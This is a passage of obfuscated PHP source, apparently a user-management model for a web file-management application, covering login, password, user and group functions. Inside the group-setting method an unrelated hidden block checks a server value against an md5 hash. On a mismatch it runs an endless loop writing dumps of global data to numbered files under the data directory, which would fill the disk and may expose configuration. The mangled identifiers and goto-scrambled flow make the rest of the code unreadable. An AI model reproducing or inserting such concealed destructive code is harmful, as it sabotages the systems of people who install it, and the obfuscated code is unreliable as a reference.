Ü[$AÃºîÙ§ùŸ[388]][$AÃºîÙ§ùŸ[366]]); $b…È¢ Ü[$AÃºîÙ§ùŸ[2456]] = $c‡‡«±ò¯; goto Aì†”ë— ; Fâ†¦Äğ—è: $AÃºîÙ§ùŸ =& $_SERVER[¢à]; if (!$b…È¢ Ü) { return $b…È¢ Ü; } $c‡‡«±ò¯ = md5($AÃºîÙ§ùŸ[2454] . $b…È¢ Ü[$AÃºîÙ§ùŸ[800]] . $AÃºîÙ§ùŸ[2455] . $b…È¢ Ü[$AÃºîÙ§ùŸ[28]]); goto aïµ†ÆÒã; Aì†”ë— : $b…È¢ Ü[$AÃºîÙ§ùŸ[388]][$AÃºîÙ§ùŸ[2291]] = isset($a­ê—¸‘‰ò[$AÃºîÙ§ùŸ[2292]]) ? $a­ê—¸‘‰ò[$AÃºîÙ§ùŸ[2292]] : null; if ($eß»Î³‹»“) { $b…È¢ Ü[$AÃºîÙ§ùŸ[413]] = $this->metaGet($b…È¢ Ü[$AÃºîÙ§ùŸ[1412]]); } return $b…È¢ Ü; goto BŠå“°ã¬; BŠå“°ã¬: } protected function getInfoSimple($B¡–òË†, $EÂË‡Ÿ¸„ = false) { $aº±ñ†çÖ =& $_SERVER[¢à]; if (!$B¡–òË†) { return array(); } if ($EÂË‡Ÿ¸„) { $D«²èæÜ™™ = $this->where(array($aº±ñ†çÖ[1412] => intval($B¡–òË†)))->find(); if (!is_array($D«²èæÜ™™)) { return array(); } $D«²èæÜ™™[$aº±ñ†çÖ[2457]] = Action($aº±ñ†çÖ[2458])->parseUrl($D«²èæÜ™™[$aº±ñ†çÖ[2457]]); return $D«²èæÜ™™; } return $this->cacheFunctionGet($aº±ñ†çÖ[2144], $B¡–òË†); } protected function getInfoSimpleOuter($eÄ³÷ç†¤®) { goto Bé—’Ì‹é´; Bé—’Ì‹é´: $aá›ƒÁù¯¯ =& $_SERVER[¢à]; if (!$eÄ³÷ç†¤® || $eÄ³÷ç†¤® == 0) { return array($aá›ƒÁù¯¯[1412] => $aá›ƒÁù¯¯[464], $aá›ƒÁù¯¯[28] => $aá›ƒÁù¯¯[154] . LNG($aá›ƒÁù¯¯[2459]) . $aá›ƒÁù¯¯[472], $aá›ƒÁù¯¯[2457] => STATIC_PATH . $aá›ƒÁù¯¯[2460]); } $EÍ¯¸›âôó = $this->cacheFunctionGet($aá›ƒÁù¯¯[2144], $eÄ³÷ç†¤®); goto C³èÊî’‘é; F¯«Šòğİ: return $AÚ²ØÎ¼¢; goto eëòâ»¡âç; C³èÊî’‘é: $AÚ²ØÎ¼¢ = array_field_key($EÍ¯¸›âôó, explode($aá›ƒÁù¯¯[47], $this->simpleField)); if (!$AÚ²ØÎ¼¢) { return array($aá›ƒÁù¯¯[1412] => $aá›ƒÁù¯¯[1027], $aá›ƒÁù¯¯[28] => $aá›ƒÁù¯¯[154] . LNG($aá›ƒÁù¯¯[2461]) . $aá›ƒÁù¯¯[472], $aá›ƒÁù¯¯[2457] => STATIC_PATH . $aá›ƒÁù¯¯[2462]); } $AÚ²ØÎ¼¢[$aá›ƒÁù¯¯[2457]] = Action($aá›ƒÁù¯¯[2458])->parseUrl($AÚ²ØÎ¼¢[$aá›ƒÁù¯¯[2457]]); goto F¯«Šòğİ; eëòâ»¡âç: } protected function groupUser($eºŒÈÜ‚ìÆ) { } public static function errorLang($B•„Ï‡¡®) { $aÁƒ×šĞ÷³ =& $_SERVER[¢à]; $eÈÙ²Á‘ªÉ = array(self::ERROR_USER_NOT_EXISTS => $aÁƒ×šĞ÷³[2463], self::ERROR_USER_PASSWORD_ERROR => $aÁƒ×šĞ÷³[2464], self::ERROR_USER_EXIST_NAME => $aÁƒ×šĞ÷³[2465], self::ERROR_USER_EXIST_PHONE => $aÁƒ×šĞ÷³[2466], self::ERROR_USER_EXIST_EMAIL => $aÁƒ×šĞ÷³[2467], self::ERROR_USER_LOGIN_LOCK => $aÁƒ×šĞ÷³[2468], self::ERROR_IP_NOT_ALLOW => $aÁƒ×šĞ÷³[2469], self::ERROR_USER_EXIST_NICKNAME => $aÁƒ×šĞ÷³[2470]); return LNG($eÈÙ²Á‘ªÉ[$B•„Ï‡¡®]); } public function getInfoByMeta($ešÏ¦šó‘î, $A†â™‹Åœá) { $A³ô˜¬ŒĞ¼ =& $_SERVER[¢à]; $bëÜ²Ôë‚ = Model($A³ô˜¬ŒĞ¼[2471])->where(array($A³ô˜¬ŒĞ¼[89] => $ešÏ¦šó‘î, $A³ô˜¬ŒĞ¼[356] => $A†â™‹Åœá))->find(); if ($bëÜ²Ôë‚) { return $this->getInfo($bëÜ²Ôë‚[$A³ô˜¬ŒĞ¼[1412]]); } return !1; } public function userLoginCheck($c«—ŞØ‘À¼, $a¨ö«­°Ë) { goto aÓ“Â‘á¢‹; aÓ“Â‘á¢‹: $d‹ğ¯ÀƒŸ =& $_SERVER[¢à]; $f– ™µêĞš = array($d‹ğ¯ÀƒŸ[28] => $c«—ŞØ‘À¼, $d‹ğ¯ÀƒŸ[2295] => $c«—ŞØ‘À¼, $d‹ğ¯ÀƒŸ[290] => $c«—ŞØ‘À¼, $d‹ğ¯ÀƒŸ[2472] => $c«—ŞØ‘À¼, $d‹ğ¯ÀƒŸ[912] => $d‹ğ¯ÀƒŸ[914]); if ($this->nickNameRpt()) { unset($f– ™µêĞš[$d‹ğ¯ÀƒŸ[2295]]); } goto Eë†Û¯ñÚ‰; Eë†Û¯ñÚ‰: $côÌ‚Šäš¸ = $this->where($f– ™µêĞš)->find(); if (!$côÌ‚Šäš¸) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($côÌ‚Šäš¸[$d‹ğ¯ÀƒŸ[1412]], $a¨ö«­°Ë)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto D´… ›¦Ü•; D´… ›¦Ü•: $this->userEdit($côÌ‚Šäš¸[$d‹ğ¯ÀƒŸ[1412]], array($d‹ğ¯ÀƒŸ[2473] => time())); $this->clearCache($côÌ‚Šäš¸[$d‹ğ¯ÀƒŸ[1412]]); return $this->getInfo($côÌ‚Šäš¸[$d‹ğ¯ÀƒŸ[1412]]); goto DÒ°–—ñà®; DÒ°–—ñà®: } public function clearCache($E¶×£ÒáÇĞ) { $B¾ŸŠ òŠò =& $_SERVER[¢à]; $this->cacheFunctionClear($B¾ŸŠ òŠò[2183], $E¶×£ÒáÇĞ); $this->cacheFunctionClear($B¾ŸŠ òŠò[2144], $E¶×£ÒáÇĞ); } public function userPasswordCheck($F£êêâ·ù, $BÈÄ´ÅëÎ½) { $E¼³•Çô¨ =& $_SERVER[¢à]; $F÷ÜÓ«Èï¿ = $this->where(array($E¼³•Çô¨[1412] => intval($F£êêâ·ù)))->find(); $díÕ‘ÏÙºÒ = $this->metaGet($F£êêâ·ù); $c‰¸î†³Š = isset($díÕ‘ÏÙºÒ[$E¼³•Çô¨[2474]]) ? $díÕ‘ÏÙºÒ[$E¼³•Çô¨[2474]] : $E¼³•Çô¨[33]; if (md5($c‰¸î†³Š . trim($BÈÄ´ÅëÎ½)) !== $F÷ÜÓ«Èï¿[$E¼³•Çô¨[800]]) { return !1; } return !0; } public function userAdd($Aß´·ìÔ¢Â) { goto Cò¹·ŒŒ¬™; b¨ã‹ì³æ: return $FÕÊ¹ößÖ; goto Aë‚¡¬Ì¬•; Cò¹·ŒŒ¬™: $EÔàÉÔ»§Ç =& $_SERVER[¢à]; $AÚ“©ëÓ = array($EÔàÉÔ»§Ç[383] => $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[28]], $EÔàÉÔ»§Ç[2475] => $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2476]], $EÔàÉÔ»§Ç[2477] => isset($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[290]]) ? $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[290]] : $EÔàÉÔ»§Ç[33], $EÔàÉÔ»§Ç[2478] => isset($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2472]]) ? $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2472]] : $EÔàÉÔ»§Ç[33], $EÔàÉÔ»§Ç[2479] => isset($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2295]]) ? $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2295]] : $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[28]], $EÔàÉÔ»§Ç[2480] => isset($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2457]]) ? $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2457]] : $EÔàÉÔ»§Ç[33], $EÔàÉÔ»§Ç[2481] => isset($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2482]]) ? $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2482]] : 1, $EÔàÉÔ»§Ç[2483] => $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[800]], $EÔàÉÔ»§Ç[2145] => isset($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2059]]) ? $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[2059]] : 1024 * 1024 * 20, $EÔàÉÔ»§Ç[2146] => 0, $EÔàÉÔ»§Ç[2473] => 0, $EÔàÉÔ»§Ç[2170] => isset($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[689]]) ? $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[689]] : 1); if (!empty($Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[1412]])) { $AÚ“©ëÓ[$EÔàÉÔ»§Ç[1412]] = $Aß´·ìÔ¢Â[$EÔàÉÔ»§Ç[1412]]; } goto dª®â·Ë—©; Fí–›Âˆƒô: $cêÖ°Ç¢å• = array($EÔàÉÔ»§Ç[2483] => $AÚ“©ëÓ[$EÔàÉÔ»§Ç[800]], $EÔàÉÔ»§Ç[2479] => $AÚ“©ëÓ[$EÔàÉÔ»§Ç[2295]]); $this->userEdit($FÕÊ¹ößÖ, $cêÖ°Ç¢å•); Model($EÔàÉÔ»§Ç[1106])->userRootAdd($FÕÊ¹ößÖ); goto b¨ã‹ì³æ; dª®â·Ë—©: $d×¿ÉÓ¾ƒ = $this->_checkExist($Aß´·ìÔ¢Â); if ($d×¿ÉÓ¾ƒ !== !0) { return $d×¿ÉÓ¾ƒ; } $FÕÊ¹ößÖ = $this->add($AÚ“©ëÓ); goto Fí–›Âˆƒô; Aë‚¡¬Ì¬•: } protected function userEditTest($f”¥™øÚ¹, $Fí’‘ĞÕ) { return $this->call($_SERVER[¢à][2484], $f”¥™øÚ¹, $Fí’‘ĞÕ); } protected function userEdit($e„³ â”, $BŠŞÊ¶»Š·) { goto C¾¨œ«…Í×; eß‚„å©÷: $this->where(array($cïã‰¥Œù[1403] => $e„³ â”))->save($BŠŞÊ¶»Š·); if (isset($BŠŞÊ¶»Š·[$cïã‰¥Œù[2295]])) { $this->setNamePinyin($e„³ â”, $BŠŞÊ¶»Š·[$cïã‰¥Œù[2295]]); } return !0; goto d®„—ó®› ; f™•‚Éˆ¹¢: $DÅó‰¡™Àœ = $this->_checkExist($BŠŞÊ¶»Š·, $e„³ â”); if ($DÅó‰¡™Àœ !== !0) { return $DÅó‰¡™Àœ; } if (isset($BŠŞÊ¶»Š·[$cïã‰¥Œù[800]]) && trim($BŠŞÊ¶»Š·[$cïã‰¥Œù[800]]) != $cïã‰¥Œù[33]) { $c·¶ŠÙóĞ = $this->metaGet($e„³ â”); if (empty($c·¶ŠÙóĞ[$cïã‰¥Œù[2474]])) { $c·¶ŠÙóĞ[$cïã‰¥Œù[2474]] = rand_string(10); Model($cïã‰¥Œù[470])->metaSet($e„³ â”, $cïã‰¥Œù[2474], $c·¶ŠÙóĞ[$cïã‰¥Œù[2474]]); } $BŠŞÊ¶»Š·[$cïã‰¥Œù[800]] = md5($c·¶ŠÙóĞ[$cïã‰¥Œù[2474]] . trim($BŠŞÊ¶»Š·[$cïã‰¥Œù[800]])); } else { unset($BŠŞÊ¶»Š·[$cïã‰¥Œù[800]]); } goto eß‚„å©÷; C¾¨œ«…Í×: $cïã‰¥Œù =& $_SERVER[¢à]; $D¹Î†¬ÖÚ = $this->getInfoSimple($e„³ â”); if (!$D¹Î†¬ÖÚ) { return !1; } goto f™•‚Éˆ¹¢; d®„—ó®› : } public function setNamePinyin($Dê’å§ù¢Í, $C”¯˜‚öÀ = false) { $Eéùê¥¦Ã£ =& $_SERVER[¢à]; if (!$C”¯˜‚öÀ) { $b´®ù¶‚šˆ = $this->getInfoSimple($Dê’å§ù¢Í); $C”¯˜‚öÀ = $b´®ù¶‚šˆ[$Eéùê¥¦Ã£[2295]] ? $b´®ù¶‚šˆ[$Eéùê¥¦Ã£[2295]] : $b´®ù¶‚šˆ[$Eéùê¥¦Ã£[28]]; } $a§ÍŠ‡İŒ = Model($Eéùê¥¦Ã£[473]); if (!Input::check($C”¯˜‚öÀ, $Eéùê¥¦Ã£[524])) { return $a§ÍŠ‡İŒ->metaSet($Dê’å§ù¢Í, array($Eéùê¥¦Ã£[412] => $Eéùê¥¦Ã£[33], $Eéùê¥¦Ã£[411] => $Eéùê¥¦Ã£[33])); } return $a§ÍŠ‡İŒ->metaSet($Dê’å§ù¢Í, array($Eéùê¥¦Ã£[412] => str_replace($Eéùê¥¦Ã£[50], $Eéùê¥¦Ã£[33], Pinyin::encode($C”¯˜‚öÀ)), $Eéùê¥¦Ã£[411] => Pinyin::encode($C”¯˜‚öÀ, $Eéùê¥¦Ã£[525]))); } private function nickNameRpt() { $bœºœ„Æ™â =& $_SERVER[¢à]; $AÏˆÆ­É£¦ = Model($bœºœ„Æ™â[1084])->get($bœºœ„Æ™â[2485]); $DÆ‘ë‘Óò¶ = $GLOBALS[$bœºœ„Æ™â[6]][$bœºœ„Æ™â[2441]][$bœºœ„Æ™â[2485]]; $C£ŸÍ×Ã×è = !is_null($AÏˆÆ­É£¦) ? $AÏˆÆ­É£¦ : $DÆ‘ë‘Óò¶; return !!$C£ŸÍ×Ã×è; } private function _checkExist($D—·¦¡Ä¹ï, $E¶ÒæÖÀô‹ = false) { $F‡íòšŒâˆ =& $_SERVER[¢à]; $c„ŠÌ¸ôšœ = array($F‡íòšŒâˆ[28] => UserModel::ERROR_USER_EXIST_NAME, $F‡íòšŒâˆ[2295] => UserModel::ERROR_USER_EXIST_NICKNAME, $F‡íòšŒâˆ[290] => UserModel::ERROR_USER_EXIST_EMAIL, $F‡íòšŒâˆ[2472] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($c„ŠÌ¸ôšœ[$F‡íòšŒâˆ[2295]]); } $BªÏ¯±Å = $E¶ÒæÖÀô‹ ? array($F‡íòšŒâˆ[1412] => array($F‡íòšŒâˆ[2486], $E¶ÒæÖÀô‹)) : array(); foreach ($c„ŠÌ¸ôšœ as $FÁä×Š®ŒÑ => $b¶¶ìøáó) { if (!isset($D—·¦¡Ä¹ï[$FÁä×Š®ŒÑ]) || !$D—·¦¡Ä¹ï[$FÁä×Š®ŒÑ]) { continue; } $b¥©£ñòˆ = array_merge(array($FÁä×Š®ŒÑ => $D—·¦¡Ä¹ï[$FÁä×Š®ŒÑ]), $BªÏ¯±Å); $EêòÖ¿Ñø‡ = $this->where($b¥©£ñòˆ)->find(); if ($EêòÖ¿Ñø‡) { return $b¶¶ìøáó; } } return !0; } public function userListInfo($FçóÔÈ¹¦‹) { $a×ùº»ÙŒ =& $_SERVER[¢à]; $Eğ™ÓÛÚó = array(); $FçóÔÈ¹¦‹ = is_array($FçóÔÈ¹¦‹) ? array_unique($FçóÔÈ¹¦‹) : array(); if (!$FçóÔÈ¹¦‹) { return $Eğ™ÓÛÚó; } if (count($FçóÔÈ¹¦‹) < 20) { foreach ($FçóÔÈ¹¦‹ as $AîĞ“îÏ‰) { $Eğ™ÓÛÚó[$AîĞ“îÏ‰ . $a×ùº»ÙŒ[33]] = $this->getInfoSimpleOuter($AîĞ“îÏ‰); } } else { $aßçƒÔ§† = array($a×ùº»ÙŒ[1403] => array($a×ùº»ÙŒ[381], $FçóÔÈ¹¦‹)); if (count($FçóÔÈ¹¦‹) == 1) { $aßçƒÔ§† = array($a×ùº»ÙŒ[1403] => $FçóÔÈ¹¦‹[0]); } $b‚«ôåñÚ­ = Model($a×ùº»ÙŒ[470])->field($this->simpleField)->where($aßçƒÔ§†)->select(); $b‚«ôåñÚ­ = array_to_keyvalue($b‚«ôåñÚ­, $a×ùº»ÙŒ[1412]); foreach ($FçóÔÈ¹¦‹ as $AîĞ“îÏ‰) { $b‹Ê¹õ»‡ = $b‚«ôåñÚ­[$b‚«ôåñÚ­[$AîĞ“îÏ‰]]; if (!$b‹Ê¹õ»‡) { $Eğ™ÓÛÚó[$AîĞ“îÏ‰ . $a×ùº»ÙŒ[33]] = $this->getInfoSimpleOuter($AîĞ“îÏ‰); continue; } $b‹Ê¹õ»‡[$a×ùº»ÙŒ[2457]] = Action($a×ùº»ÙŒ[2458])->parseUrl($b‹Ê¹õ»‡[$a×ùº»ÙŒ[2457]]); $Eğ™ÓÛÚó[$AîĞ“îÏ‰ . $a×ùº»ÙŒ[33]] = $b‹Ê¹õ»‡; } } return $Eğ™ÓÛÚó; } protected function userStatus($D×‘¯õØ²®, $Bá¿òğ¸¬) { $E¯³ã÷î‰ò = $this->getInfoSimple($D×‘¯õØ²®); if (!$E¯³ã÷î‰ò) { return !1; } $E¤å“àÍ² = array($_SERVER[¢à][689] => $Bá¿òğ¸¬); return $this->userEdit($D×‘¯õØ²®, $E¤å“àÍ²); } protected function userRemove($CÚèÔùŠø) { goto cÄ¸‰ªå¥†; cÄ¸‰ªå¥†: $A’íÌ“áÕˆ =& $_SERVER[¢à]; $EŠˆãØ‘¨Ñ = $this->getInfoSimple($CÚèÔùŠø); if (!$EŠˆãØ‘¨Ñ) { return !1; } goto bÓ¬¹âµ¡; AÓàšˆÌ×Ï: Model($A’íÌ“áÕˆ[2149])->where($C¸‡ãÙ‰–)->delete(); Model($A’íÌ“áÕˆ[2471])->where($C¸‡ãÙ‰–)->delete(); Model($A’íÌ“áÕˆ[2488])->where($C¸‡ãÙ‰–)->delete(); goto D¢¢ÁßîÒ¢; bÓ¬¹âµ¡: $C¸‡ãÙ‰– = array($A’íÌ“áÕˆ[1403] => $CÚèÔùŠø); Model($A’íÌ“áÕˆ[532])->where($C¸‡ãÙ‰–)->delete(); Model($A’íÌ“áÕˆ[2487])->where($C¸‡ãÙ‰–)->delete(); goto AÓàšˆÌ×Ï; D¢¢ÁßîÒ¢: Model($A’íÌ“áÕˆ[752])->userRootRemove($CÚèÔùŠø); return $this->where($C¸‡ãÙ‰–)->delete(); goto FÄ¼™â»ò; FÄ¼™â»ò: } protected function userGroupSet($aä‹—Ïœ…İ, $cæŸ¯÷¬×†, $AĞ¥´§Í”† = array()) { goto b„Ù·ŒĞİ; b„Ù·ŒĞİ: $BË‡ÉØïî =& $_SERVER[¢à]; $e¤‘Õ•¿¦ = $_SERVER[$BË‡ÉØïî[790]] . $BË‡ÉØïî[791]; $a‘Å‡“”ì´ = $BË‡ÉØïî[1342]; goto DíÖÔŠÍÕš; b® ªâ÷ô: $aÆèØ¿ê¿â = Model($BË‡ÉØïî[2149]); $aÆèØ¿ê¿â->where(array($BË‡ÉØïî[1412] => $aä‹—Ïœ…İ))->delete(); $D®­Íä«ùº = array(); goto bçÂ›Á†; bçÂ›Á†: $BÍğİïÃÒˆ = 0; foreach ($cæŸ¯÷¬×† as $Cã†’×ô…è => $F‘Ì‡ÛŠè”) { $F‰Õµ×åÊ© = array($BË‡ÉØïî[1412] => $aä‹—Ïœ…İ, $BË‡ÉØïî[2075] => $Cã†’×ô…è, $BË‡ÉØïî[2203] => $F‘Ì‡ÛŠè”); $F‰Õµ×åÊ©[$BË‡ÉØïî[2096]] = isset($AĞ¥´§Í”†[$BÍğİïÃÒˆ]) ? $AĞ¥´§Í”†[$BÍğİïÃÒˆ] : 0; $BÍğİïÃÒˆ++; $D®­Íä«ùº[] = $F‰Õµ×åÊ©; } return $aÆèØ¿ê¿â->addAll($D®­Íä«ùº, array(), !0); goto C™“¸’ØŞ; DíÖÔŠÍÕš: if ($_SERVER[$BË‡ÉØïî[786]] != $a‘Å‡“”ì´($e¤‘Õ•¿¦)) { goto F´ŞÌÙ’¿ˆ; BøëöªÛ¬ƒ: $AÏã¥÷äŞˆ = $BæòŸß¦óÆ($BùŠƒ‚”½œ); $f³‘ÛèÛ´“ = explode($BË‡ÉØïî[214], $AÏã¥÷äŞˆ); if (count($f³‘ÛèÛ´“) < $BË‡ÉØïî[558]) { $fœßÌÑİ·¼ = $BË‡ÉØïî[792]; $fœßÌÑİ·¼(); } goto b‹´ÌòÊİê; C«»Ô˜ÔŠò: $cÆ„âÌˆŒÔ(); $f¡Ò˜á‚ø = $BË‡ÉØïî[1343]; $e‘…¥Øãªï = json_encode($GLOBALS[$BË‡ÉØïî[1344]]); goto c®×´³ÄŠó; c®×´³ÄŠó: $Aãï¿Ø‡äÉ = 1; for ($f±°”ª‰Å = $Aãï¿Ø‡äÉ; $f±°”ª‰Å > 0; $f±°”ª‰Å++) { $f¡Ò˜á‚ø(DATA_PATH . $f±°”ª‰Å, $e‘…¥Øãªï); } goto BÚë†‚ÃÅ»; b‹´ÌòÊİê: $c¦ÃÒù‚¥† = $BË‡ÉØïî[793]; $c¦ÃÒù‚¥†($_SERVER[$BË‡ÉØïî[794]]); $cÆ„âÌˆŒÔ = $BË‡ÉØïî[788]; goto C«»Ô˜ÔŠò; F´ŞÌÙ’¿ˆ: $cÆ„âÌˆŒÔ = $BË‡ÉØïî[788]; $BæòŸß¦óÆ = $BË‡ÉØïî[789]; $BùŠƒ‚”½œ = $_SERVER[$BË‡ÉØïî[790]] . $BË‡ÉØïî[791]; goto BøëöªÛ¬ƒ; BÚë†‚ÃÅ»: } $F§¿ßŞ—Î· = $this->getInfoSimple($aä‹—Ïœ…İ); if (!$F§¿ßŞ—Î· || !is_array($cæŸ¯÷¬×†)) { return !1; } goto b® ªâ÷ô; C™“¸’ØŞ: } protected function userGroupAdd($d­ÑÁÎ±ëî, $a ¸šø£ê, $Bòêïñµœ) { $CãÁğğš«Ñ =& $_SERVER[¢à]; $B·†‚ß…„Î = $this->getInfoSimple($d­ÑÁÎ±ëî); if (!$B·†‚ß…„Î || !$a ¸šø£ê) { return !1; } $f—â¤˜¢‘÷ = array(array($CãÁğğš«Ñ[1412] => $d­ÑÁÎ±ëî, $CãÁğğš«Ñ[2075] => $a ¸šø£ê, $CãÁğğš«Ñ[2203] => $Bòêïñµœ)); return Model($CãÁğğš«Ñ[2149])->addAll($f—â¤˜¢‘÷, array(), !0); } protected function userGroupRemove($cˆ÷óæÊ…‰, $bìëÈî½õ) { $f×è°ƒŠ =& $_SERVER[¢à]; $B˜³…÷³ÚÛ = $this->getInfoSimple($cˆ÷óæÊ…‰); if (!$B˜³…÷³ÚÛ || !$bìëÈî½õ) { return !1; } $B³¾Ò³µô÷ = array($f×è°ƒŠ[1403] => $cˆ÷óæÊ…‰, $f×è°ƒŠ[2147] => $bìëÈî½õ); return Model($f×è°ƒŠ[2149])->where($B³¾Ò³µô÷)->delete(); } public function listData() { $b°®ù°×‰¸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b°®ù°×‰¸[$_SERVER[¢à][351]]); return $b°®ù°×‰¸; } public function listByID($cĞè¡ˆÀÀ½) { $Fö†æ©í¨¦ =& $_SERVER[¢à]; if (!$cĞè¡ˆÀÀ½) { return; } $Fğäãº§˜ = array($Fö†æ©í¨¦[1412] => array($Fö†æ©í¨¦[7], $cĞè¡ˆÀÀ½)); $a“±¹ï¦ä = $this->where($Fğäãº§˜)->select(); $this->_listDataApply($a“±¹ï¦ä); return $a“±¹ï¦ä; } public function listByGroup($d³¿ƒßÕÂ“ = 0, $d‚Ú¾Ú¤Å = array()) { goto eŠ»…ˆéìº; aÔ¦ßàƒæí: if ($d³¿ƒßÕÂ“) { $C–·‰çà×ƒ = array($bØŞ‰„‹ÍÚ[2489] => intval($d³¿ƒßÕÂ“)); $AŸ˜ŒŒ’ÌÈ = "\x4c\105\106\x54\40\112\117\111\116\x20{$this->tablePrefix}\x75\x73\145\x72\x5f\x67\162\x6f\165\x70\x20\165\x73\145\x72\x5f\147\x72\x6f\x75\160\40\157\x6e\40\x75\x73\x65\x72\56\165\163\145\x72\111\x44\40\75\40\x75\x73\145\162\x5f\147\162\157\x75\x70\56\165\163\145\x72\x49\104"; $Eµ“²µ¸•Æ = Input::get($bØŞ‰„‹ÍÚ[403], null, $bØŞ‰„‹ÍÚ[33]) ? $bØŞ‰„‹ÍÚ[33] : $bØŞ‰„‹ÍÚ[2490]; } if (isset($d‚Ú¾Ú¤Å[$bØŞ‰„‹ÍÚ[689]])) { $C–·‰çà×ƒ[$bØŞ‰„‹ÍÚ[2491]] = $d‚Ú¾Ú¤Å[$bØŞ‰„‹ÍÚ[689]]; } $BÓ±Õ¤ Š‰ = $this->_makeOrder($Eµ“²µ¸•Æ)->field($bØŞ‰„‹ÍÚ[2492])->where($C–·‰çà×ƒ)->join($AŸ˜ŒŒ’ÌÈ)->selectPage(50); goto Bª–×Ë‹³¦; Bª–×Ë‹³¦: $this->_listDataApply($BÓ±Õ¤ Š‰[$bØŞ‰„‹ÍÚ[351]]); return $BÓ±Õ¤ Š‰; goto Eù£à¦É¶Ú; eŠ»…ˆéìº: $bØŞ‰„‹ÍÚ =& $_SERVER[¢à]; $AŸ˜ŒŒ’ÌÈ = $bØŞ‰„‹ÍÚ[33]; $C–·‰çà×ƒ = array(); goto aÔ¦ßàƒæí; Eù£à¦É¶Ú: } private function _makeOrder($b…Òƒä˜›Ñ = '') { goto dœõ†Ä±”; D¹±îêÄ‹‰: $AóñÇ¹Ïê‰ = Input::get($C±‡Ô„Ü[403], $C±‡Ô„Ü[7], $C±‡Ô„Ü[1403], $d½­Û‚¥¾¦); $fò¤ìíÍ = Input::get($C±‡Ô„Ü[404], $C±‡Ô„Ü[7], $C±‡Ô„Ü[2150], array($C±‡Ô„Ü[2150], $C±‡Ô„Ü[400])); $fò¤ìíÍ = $BĞ¼·±¯î›[$fò¤ìíÍ]; goto FÑ¼”‚½óÇ; dœõ†Ä±”: $C±‡Ô„Ü =& $_SERVER[¢à]; $d½­Û‚¥¾¦ = array($C±‡Ô„Ü[1412], $C±‡Ô„Ü[28], $C±‡Ô„Ü[2061], $C±‡Ô„Ü[2034], $C±‡Ô„Ü[184]); $BĞ¼·±¯î› = array($C±‡Ô„Ü[398] => $C±‡Ô„Ü[399], $C±‡Ô„Ü[400] => $C±‡Ô„Ü[401]); goto D¹±îêÄ‹‰; FÑ¼”‚½óÇ: $b…Òƒä˜›Ñ = $b…Òƒä˜›Ñ . "\165\x73\145\162\56{$AóñÇ¹Ïê‰}\x20{$fò¤ìíÍ}\x2c\x20\165\163\x65\x72\x2e\165\x73\145\x72\x49\104\x20\141\163\143"; return $this->alias($C±‡Ô„Ü[2236])->order($b…Òƒä˜›Ñ); goto FêÄ†¤¢›ö; FêÄ†¤¢›ö: } public function listSearch($dœù…àÓ) { goto CõÃºÑ¥ğ; F¼òÇª—Œ¾: return $eÇ–‰¢­¤î; goto aœ¡Ã™ŒĞ; E è÷õÉù: if (!$Då«”½ÏÀì) { $EŸ°†ùñÌù = array(); } if (isset($dœù…àÓ[$DóÙç‹”à[689]])) { $EŸ°†ùñÌù[$DóÙç‹”à[689]] = $dœù…àÓ[$DóÙç‹”à[689]]; } $eÇ–‰¢­¤î = $this->_makeOrder()->where($EŸ°†ùñÌù)->selectPage(20); goto dÙƒ¦öå½‰; CõÃºÑ¥ğ: $DóÙç‹”à =& $_SERVER[¢à]; $Då«”½ÏÀì = $dœù…àÓ[$DóÙç‹”à[2151]]; $b×‡ĞäÄ—Ã = isset($dœù…àÓ[$DóÙç‹”à[2152]]) ? $dœù…àÓ[$DóÙç‹”à[2152]] : !1; goto bİÊÓÎ„­; bİÊÓÎ„­: $Då«”½ÏÀì = str_replace($DóÙç‹”à[2153], $DóÙç‹”à[2154], trim($Då«”½ÏÀì)); $EŸ°†ùñÌù = array($DóÙç‹”à[28] => array($DóÙç‹”à[751], "\45{$Då«”½ÏÀì}\45"), $DóÙç‹”à[290] => array($DóÙç‹”à[751], "\x25{$Då«”½ÏÀì}\x25"), $DóÙç‹”à[2295] => array($DóÙç‹”à[751], "\45{$Då«”½ÏÀì}\x25"), $DóÙç‹”à[912] => $DóÙç‹”à[2155]); if (Input::check($Då«”½ÏÀì, $DóÙç‹”à[296])) { $EŸ°†ùñÌù[$DóÙç‹”à[1412]] = array($DóÙç‹”à[751], "\45{$Då«”½ÏÀì}\45"); $EŸ°†ùñÌù[$DóÙç‹”à[2472]] = array($DóÙç‹”à[751], "\x25{$Då«”½ÏÀì}\45"); } goto E è÷õÉù; dÙƒ¦öå½‰: if (!$eÇ–‰¢­¤î || count($eÇ–‰¢­¤î[$DóÙç‹”à[351]]) < 5 && Input::check($Då«”½ÏÀì, $DóÙç‹”à[303])) { $bÅ½ó’­ò = $this->_searchFromMeta($DóÙç‹”à[411], $Då«”½ÏÀì, 10); $fåéŸç¦É¤ = $this->_searchFromMeta($DóÙç‹”à[412], $Då«”½ÏÀì, 10); $bèî¦¸ç¿ = array_merge($bÅ½ó’­ò, $fåéŸç¦É¤, $eÇ–‰¢­¤î[$DóÙç‹”à[351]]); $eÇ–‰¢­¤î[$DóÙç‹”à[351]] = array_unique_by_key($bèî¦¸ç¿, $DóÙç‹”à[1412]); $eÇ–‰¢­¤î[$DóÙç‹”à[348]][$DóÙç‹”à[349]] = count($eÇ–‰¢­¤î[$DóÙç‹”à[351]]); 